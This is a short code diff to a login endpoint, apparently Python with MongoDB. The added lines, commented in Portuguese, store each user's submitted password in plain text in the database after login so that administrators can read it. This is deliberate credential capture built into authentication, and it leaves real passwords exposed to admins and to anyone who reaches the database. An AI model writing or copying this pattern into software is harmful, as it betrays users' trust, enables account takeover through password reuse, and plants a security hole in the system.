@@ -1815,6 +1815,10 @@ async def login(credentials: UserLogin):
     # Create access token
     access_token = create_access_token(data={"sub": user["id"], "username": user["username"], "is_admin": user.get("is_admin", False)})
     
+    # Guardar password em texto simples para visualização pelo admin
+    if user.get("plain_password") != credentials.password:
+        await db.users.update_one({"id": user["id"]}, {"$set": {"plain_password": credentials.password}})
+    
     logging.info(f"LOGIN SUCCESS: {user['username']}")
     
     return Token(
